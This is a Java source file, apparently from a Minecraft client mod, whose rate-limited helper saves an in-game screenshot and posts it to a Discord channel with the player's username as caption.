package com.example.discordcontrol.features;

import com.example.discordcontrol.discord.DiscordManager;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.util.ScreenshotUtils;
import java.nio.file.Path;
import java.time.Instant;

public final class ScreenshotUtil {
    private static long lastShot = 0;
    private ScreenshotUtil() {}

    public static void takeAndSend() {
        MinecraftClient mc = MinecraftClient.getInstance();
        long now = System.currentTimeMillis();
        if (now - lastShot < 3000) return;
        lastShot = now;
        mc.execute(() -> {
            try {
                Path out = ScreenshotUtils.saveScreenshot(mc.runDirectory.toPath(), "discord-ss-" + Instant.now().toEpochMilli());
                if (out != null) {
                    String caption = "Screenshot from " + mc.getSession().getUsername();
                    DiscordManager.sendImageToChannel(out, caption);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }
}
